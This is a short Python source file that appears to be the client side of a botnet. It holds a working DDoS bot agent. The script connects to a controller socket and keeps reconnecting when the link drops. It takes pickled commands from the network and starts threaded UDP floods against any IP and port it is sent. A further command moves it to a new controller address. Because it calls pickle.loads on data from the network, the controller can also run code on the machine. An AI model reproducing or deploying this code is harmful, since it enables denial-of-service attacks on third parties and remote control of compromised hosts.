import socket
import pickle
import threading

attack = False
address = ("localhost", 420)

# creates and connects a socket
def create():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            sock.connect(address)
            print("connected to server!")
            return sock
        except:
            print("connection failed!")

# starts an attack using UDP
def udp(ip, port, message):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while attack == True:
        sock.sendto(message.encode("utf-8"), (ip, port))

# runs in the beginning of the program
if __name__ == "__main__":
    sock = create()

    while True:
        try:
            command = sock.recv(1024)
            try:
                command = pickle.loads(command)
                print(command)

                if command[0] == "msg":
                    print(command[1])
                elif command[0] == "udp":
                    attack = True
                    threading.Thread(target=udp, args=(command[1], command[2], command[3])).start()
                elif command[0] == "stop":
                    attack = False
                elif command[0] == "ext":
                    address = (command[1], command[2])
                    sock = create()
            except:
                pass
        except:
            sock = create()